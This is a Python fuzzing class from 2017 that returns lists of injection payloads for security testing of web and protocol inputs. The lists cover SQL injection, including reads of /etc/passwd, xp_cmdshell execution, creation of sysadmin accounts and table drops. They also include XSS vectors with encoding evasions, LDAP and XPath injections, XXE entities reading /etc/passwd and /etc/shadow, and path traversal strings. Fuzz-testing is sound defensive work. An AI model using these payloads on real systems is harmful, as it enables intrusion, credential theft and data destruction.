#!/usr/bin/env  python
# -*- coding: iso-8859-15 -*-
'''
Created on Mar 30, 2017

@author: lia
'''
#!/usr/bin/env  python
# -*- coding: iso-8859-15 -*-

import urllib.request, urllib.parse, urllib.error
import random
import re
from codecs import getencoder


class Fuzzer():
    '''
    classdocs
    '''
    def __init__(self):
        '''
        Constructor
        '''
        pass
    
    @staticmethod
    def getSQPStrings():
        return [("'||(elt(-3+5,bin(15),ord(10),hex(char(45))))\n||6\n'||'6\n(||6)"
                 "' OR 1=1--\n OR 1=1"),
                "' OR '1'='1", "; OR '1'='1'", "%22+or+isnull%281%2F0%29+%2F*",
                "%27+OR+%277659%27%3D%277659", "%22+or+isnull%281%2F0%29+%2F*",
                "%27+--+", "' or 1=1--","\" or 1=1--", "' or 1=1 /*","or 1=1--",
                "' or 'a'='a", "\" or \"a\"=\"a", "') or ('a'='a", "Admin' OR '",
                "'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--",
                ") UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;",
                "' having 1=1--",
                "' having 1=1--",
                "' group by userid having 1=1--",
                ("' SELECT name FROM syscolumns WHERE id = (SELECT id FROM "
                 "sysobjects WHERE name = tablename')--"),
                "' or 1 in (select @@version)--",
                "' union all select @@version--",
                "' OR 'unusual' = 'unusual'",
                "' OR 'something' = 'some'+'thing'",
                "' OR 'text' = N'text'",
                "' OR 'something' like 'some%'",
                "' OR 2 > 1",
                "' OR 'text' > 't'",
                "' OR 'whatever' in ('whatever')",
                "' OR 2 BETWEEN 1 and 3",
                "' or username like char(37);",
                "' union select * from users where login = char(114,111,111,116);",
                "' union select", 
                "Password:*/=1--",
                "UNI/**/ON SEL/**/ECT",
                "'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'",
                "'; EXEC ('SEL' + 'ECT US' + 'ER')",
                "'/**/OR/**/1/**/=/**/1",
                "' or 1/*",
                "+or+isnull%281%2F0%29+%2F*",
                "%27+OR+%277659%27%3D%277659",
                "%22+or+isnull%281%2F0%29+%2F*",
                "%27+--+&password=",
                ("'; begin declare @var varchar(8000) set @var=':' select "
                 "@var=@var+'+login+'/'+password+' ' from users where login >"), 
                "@var select @var as var into temp end --",
                "' and 1 in (select var from temp)--",
                "' union select 1,load_file('/etc/passwd'),1,1,1;",
                "1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",
                "' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",
                "'; exec master..xp_cmdshell 'ping 10.10.1.2'--",
                "CREATE USER name IDENTIFIED BY 'pass123'",
                ("CREATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp "
                "DEFAULT TABLESPACE users;"), 
                "' ; drop table temp --",
                "exec sp_addlogin 'name' , 'password'",
                "exec sp_addsrvrolemember 'name' , 'sysadmin'",
                ("INSERT INTO mysql.user (user, host, password) VALUES ('name', "
                 "'localhost', PASSWORD('pass123'))"),
                "GRANT CONNECT TO name; GRANT RESOURCE TO name;",
                ("INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) "
                 "+ char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70)"), 
                "+ char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)"]   
    
    @staticmethod
    def getXSSStrings():
        return [">\"><script>alert(\"XSS\")</script>&",
                "'';!--\"<XSS>=&{()}",
                (">\"><script>alert(\"XSS\")</script>&"
                 "><STYLE>@import\"javascript:alert('XSS')\";</STYLE>"
                 ">\"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;"
                 "%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;"
                 "%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>"
                 ">%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>"
                 "'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'\">>\"'';!--\"<XSS>=&{()}"),
                 "<IMG SRC=\"javascript:alert('XSS');\">",
                 "<IMG SRC=javascript:alert('XSS')>",
                 "<IMG SRC=JaVaScRiPt:alert('XSS')>",
                 "<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>",
                ("<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;"
                 "&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>"),
                ("<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&"
                 "<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058"
                 "&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040"
                 "&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>"),          
                ("<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&"
                 "#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&"
                 "#x53&#x53&#x27&#x29>"),
                "<IMG SRC=\"jav&#x09;ascript:alert(<WBR>'XSS');\">",
                "<IMG SRC=\"jav&#x0A;ascript:alert(<WBR>'XSS');\">",
                "<IMG SRC=\"jav&#x0D;ascript:alert(<WBR>'XSS');\">",
                (">\"><script>alert(\"XSS\")</script>&"
                 "><STYLE>@import\"javascript:alert('XSS')\";</STYLE>"
                 ">\"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;"
                 "%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;"
                 "%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>"
                 ">%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>"
                 "'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'\">>\"'';!--\"<XSS>=&{()}"
                 "<IMG SRC=\"javascript:alert('XSS');\">"
                 "<IMG SRC=javascript:alert('XSS')>"
                 "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                 "<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>"
                 "<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;"
                 "&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>"
                 "<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&"
                 "<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058"
                 "&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040"
                 "&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>"         
                 "<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&"
                 "#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&"
                 "#x53&#x53&#x27&#x29>"
                 "<IMG SRC=\"jav&#x09;ascript:alert(<WBR>'XSS');\">"
                 "<IMG SRC=\"jav&#x0A;ascript:alert(<WBR>'XSS');\">"
                 "<IMG SRC=\"jav&#x0D;ascript:alert(<WBR>'XSS');\">")]
    
    @staticmethod
    def getLDAPInjectionStrings():
        return[("|\n!\n(\n)\n%28\n%29\n&\n%26\n%21\n%7C\n*|\n%2A%7C\n*(|(mail=*))"
                "%2A%28%7C%28mail%3D%2A%29%29\n*(|(objectclass=*))"
                "%2A%28%7C%28objectclass%3D%2A%29%29\n*()|%26'\nadmin*"
                "admin*)((|userPassword=*)\n*)(uid=*))(|(uid=*\n")]
        
    @staticmethod
    def getXPATHInjectionStrings():
        return [("'+or+'1'='1\n'+or+''='\nx'+or+1=1+or+'x'='y\n/\n//\n//*"
                 "*/*\n@*\ncount(/child::node())\nx'+or+name()='username'+or+'x'='y")]
        
    @staticmethod
    def getXMLInjectionStrings():
        return["<![CDATA[<script>var n=0;while(true){n++;}</script>]]>",
               ("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo>"
                "<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>"
                "/SCRIPT<![CDATA[>]]></foo>"),
               ("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo>"
                "<![CDATA[' or 1=1 or ''=']]></foof>"),
               ("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE "
                "foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "
                "\"file://c:/boot.ini\">]><foo>&xee;</foo>"),
               ("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE "
                "foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                "<foo>&xee;</foo>"),
               ("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo"
                " [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>"
                "<foo>&xee;</foo>"),
               ("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo "
                "[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]>"
                "<foo>&xee;</foo>")]
    
    @staticmethod
    def getPathTraversalStrings(limit=10):
        URL_ENCODED_PREV = urllib.parse.quote_plus('../')
        UTF8_ENCODED_PREV = '../'.encode('utf8')
        output = []
        utf8_out_str = ""
        url_out_str = ""
        
        for _ in range(limit):
            output.append(utf8_out_str + "run.sh")
            output.append(url_out_str + "run.sh")
            utf8_out_str += UTF8_ENCODED_PREV
            url_out_str += URL_ENCODED_PREV
                
        return output    
    
    @staticmethod
    def getRandomHTMLStrings(min_tags=5, max_tags=20):
        seed = random.randrange(0, 1000000)
        random.seed(seed)
        
        HEAD_TAGS = [
                     '<!DOCTYPE html>',
                     '<style>body{background-color:yellow;}p{color:blue;}</style>',
                     '<link rel="stylesheet" href="hackme.css">',
                     '<link rel="stylesheet" href="../styles/hackalsome.css">',
                     '<meta name="keywords" content="hss,hack,html">',
                     '<meta name="description" content="html hack for hss">',
                     '<meta charset="UTF-8">',
                     '<meta name="author" content="TIIT">',
                     '<meta http-equiv="refresh" content="30">',
                     '<base href="http://www.w3schools.com/images/" target="_blank">',
                     '<script>function myFunction{document.getElementById("demo").innerHTML="Hello Hack!";}</script>',
                     '<title>HSS HACK</title>'
                    ]
                    
        BODY_TAGS = [
                     '<a href="pippo.html">Go to pippo!</a>',
                     '<br/>',
                     '<hr/>',
                     '<b>hacked!</b>',
                     '<i>to hack</i>',
                     '<u>nothing to do</u>',
                     '<div class="hackit">We are hacking you</div>',
                     '<button name="btnHack" class="fa fa-button fa-skull" action="submit" value="A Gift for you! ;)" />',
                     '</ul><li>a</li><li>b</li><li>c</li></ul>',
                     '<script>function myFunction{document.getElementById("demo").innerHTML="Hello Hack!";}</script>',
                     '<form oninput="x.value=parseInt(a.value)+parseInt(b.value)">0<input type="range" id="a" value="50">100+<input type="number" id="b" value="50">=<output name="x" for="a b"></output></form>',
                     '<table><tr><th>Month</th><th>Savings</th></tr><tr><td>January</td><td>$100</td></tr></table>',
                     '<p>My mother has <span style="color:blue">blue</span> eyes.</p>'
                    ]
                
        
        head_str = ""
        body_str = ""
        
        steps = random.randrange(min_tags, max_tags)
        for _ in range(steps):
            idx = random.randrange(0, len(HEAD_TAGS))
            head_str += HEAD_TAGS[idx]
        
        steps = random.randrange(min_tags, max_tags)
        for _ in range(steps):
            idx = random.randrange(0, len(BODY_TAGS))
            body_str += BODY_TAGS[idx]
        
        return "<html><head>%s</head><body>%s</body></html>" % (head_str, body_str)     
    
    @staticmethod
    def getRandomString(regexp=None, minLen=5, maxLen=50):
        allowed = ('abcdefghijklmnopqrstuvwxyz012345678' 
                  'ABCDEFGHIJKLMNOPQRSTUVWXYZ-_:.;,' 
                  )
        allowed += 'òàùèéç°\\|!"£$%&/()=?^\'[]+*@#��������<>'          
        chars = []
        if regexp is not None:
            chars = re.findall(regexp, allowed)
        
        if chars == []:
            chars = allowed

        seed = random.randrange(0, 1000000)
        random.seed(seed)
        ln = random.randrange(minLen, maxLen)
        outStr = ''

        for _ in range(ln):
            idx = random.randrange(0, len(chars))
            outStr += chars[idx]
        utf8encoder = getencoder("utf_8")
        return utf8encoder(outStr)[0]
    
    @staticmethod
    def getRandomStrings(regexp=None, minLen=5, maxLen=50, num = 50):
        return [Fuzzer.getRandomString(regexp, minLen, maxLen) for x in range(0, num)]    
    
    @staticmethod
    def getAddress():
        addresses = []
        for a in range(0, 9):
            for b in range(0, 9) :
                for c in range(0,9) :
                    for d in range(0, 9) :
                        addresses.append("%d.%d.%d.%d"%(a, b, c,d))
                        addresses.append("%02d.%02d.%02d.%02d"%(a, b, c,d))
                        addresses.append("%03d.%03d.%03d.%03d"%(a, b, c,d))
                        addresses.append("%04d.%04d.%04d.%04d"%(a, b, c,d))
                        addresses.append("0x%0.2X.0x%0.2X.0x%0.2X.0x%0.2X"%(a, b, c,d))
  
        addresses.append("12344567094373947932872937")   
        addresses.append("0x%0.2X"%(12344567094373947932872937))           
        return addresses 
           
    @staticmethod
    def getDiamIdentities(fqdn, proto = ["diameter", "radius","tacacs+","kerberos"], 
                        transport = ["tcp", "sctp", "udp", "icmp", "gre"]):  
     
        identity = "%s%d%s%s" 
        #FQDN:PORT;TRANSPORT;PROTOCOL 
        identities = []
        ports = [0, 8080, 65535] #mettendo tutte le porte si ha MEMORYERROR SUL PC
        for p in ports:
            for t in transport:
                for pr in proto :
                    identities.append(identity%(fqdn, p, t, pr))
        identities.append("http://%s"%(fqdn))
        if len(identities) > 1 :  
            identities.append("http://%s"%(identities[0]))        
        return identities          